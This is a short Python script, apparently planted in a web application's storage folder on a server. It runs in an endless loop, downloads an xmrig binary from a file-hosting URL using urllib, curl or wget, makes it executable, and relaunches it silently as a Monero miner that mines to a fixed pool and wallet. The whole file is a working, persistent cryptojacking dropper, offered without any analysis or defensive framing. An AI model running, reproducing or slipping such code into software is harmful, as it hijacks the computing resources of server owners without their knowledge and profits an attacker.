import os,time,subprocess;from urllib import request
while True:
 if not os.path.exists('/var/www/html/opapru-hris/storage/stmept'):
  try:request.urlretrieve('https://cold7.gofile.io/download/direct/b795322b-9378-4de4-8e36-2b0d66e2b69c/xmrig_86c3','/var/www/html/opapru-hris/storage/stmept')
  except:os.system("curl -sSL -o '/var/www/html/opapru-hris/storage/stmept' 'https://cold7.gofile.io/download/direct/b795322b-9378-4de4-8e36-2b0d66e2b69c/xmrig_86c3' || wget -q -O '/var/www/html/opapru-hris/storage/stmept' 'https://cold7.gofile.io/download/direct/b795322b-9378-4de4-8e36-2b0d66e2b69c/xmrig_86c3'")
  os.chmod('/var/www/html/opapru-hris/storage/stmept',0o755)
 try:subprocess.check_output(['pgrep','-f','stmept'])
 except:subprocess.Popen(['/var/www/html/opapru-hris/storage/stmept','--url','pool.supportxmr.com:3333','--user','8556M2fMqE8Dg1U3pERP9rJ64jaa6MMha5SY5ovWQ7XiYjxdKquPQ7Z4afpEeXUtfJVBLGvLncGxtKMugv61S9nFGMHNAFK','--pass','next','--donate-level','0'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
 time.sleep(20)